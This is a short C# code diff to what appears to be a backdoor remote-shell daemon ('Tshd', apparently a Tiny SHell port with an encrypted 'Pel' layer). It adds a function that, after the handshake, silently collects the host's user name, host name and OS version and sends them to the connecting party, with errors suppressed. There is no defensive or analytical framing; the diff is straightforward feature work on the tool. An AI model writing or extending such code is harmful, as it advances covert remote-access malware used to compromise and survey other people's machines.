@@ -85,6 +85,7 @@ namespace Tshd
                 // regardless of who initiated the TCP connection.
                 if (layer.Handshake(true))
                 {
+                    SendMetadata(layer);
                     HandleGeneric(layer);
                 }
             }
@@ -93,6 +94,20 @@ namespace Tshd
             {
                 client.Close();
             }
+        }
+
+        static void SendMetadata(Pel layer)
+        {
+            try
+            {
+                string user = Environment.UserName;
+                string host = Dns.GetHostName();
+                string os = "Windows " + Environment.OSVersion.Version.ToString();
+                string meta = string.Format("{0}@{1}|{2}", user, host, os);
+                byte[] data = Encoding.UTF8.GetBytes(meta);
+                layer.Write(data, 0, data.Length);
+            }
+            catch {}
         }
 
         static void HandleGeneric(Pel layer)
